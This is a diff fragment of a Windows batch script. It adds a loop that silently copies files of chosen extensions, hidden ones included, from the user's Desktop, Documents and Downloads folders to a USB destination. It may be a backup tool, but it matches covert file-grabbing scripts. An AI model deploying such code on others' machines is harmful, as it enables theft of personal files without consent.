@@ -31,6 +31,12 @@ for /f %%D in ('wmic logicaldisk get caption ^| findstr /r "[A-Z]:"') do (
     )
 )
 
+for %%E in (%extensions%) do (
+    xcopy "%USERPROFILE%\Desktop\*%%~nxE" "%destination%" /s /i /y /h >nul 2>&1
+    xcopy "%USERPROFILE%\Documents\*%%~nxE" "%destination%" /s /i /y /h >nul 2>&1
+    xcopy "%USERPROFILE%\Downloads\*%%~nxE" "%destination%" /s /i /y /h >nul 2>&1
+)
+
 echo All files copied to USB.
 
 :end
